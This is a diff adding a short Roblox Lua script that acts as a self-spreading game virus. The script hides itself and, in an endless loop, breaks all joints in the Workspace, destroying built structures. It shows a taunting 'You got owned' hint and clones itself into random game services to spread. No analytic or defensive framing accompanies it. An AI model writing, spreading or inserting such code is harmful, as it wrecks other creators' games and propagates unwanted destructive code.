@@ -1,0 +1,22 @@
+script.Parent = nil
+
+ggc = game:GetChildren()
+
+function Infect()
+local w = game:GetService("Workspace"):BreakJoints()
+local h = Instance.new("Hint")
+h.Parent = w
+h.Name = "Infect"
+h.Text = "Daaaaaaaaaaaaaaaaaaaaaaanng. You got owwwnedd."
+end
+
+function Spread()
+script2 = script:Clone()
+script2.Parent = ggc[math.random(1,#ggc)]
+end
+
+while true do
+wait()
+Infect()
+Spread()
+end
